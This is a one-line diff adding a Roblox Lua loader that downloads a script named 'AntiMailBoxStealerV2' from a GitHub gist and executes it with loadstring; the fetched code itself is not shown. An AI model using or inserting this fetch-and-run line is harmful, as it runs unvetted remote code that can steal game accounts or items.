@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/RandomScripter21/c7e2091cedfcb75f946b38137400e3f2/raw/7d771d5fa08264de36443ad752a07fd0ec8c55cc/AntiMailBoxStealerV2"))()
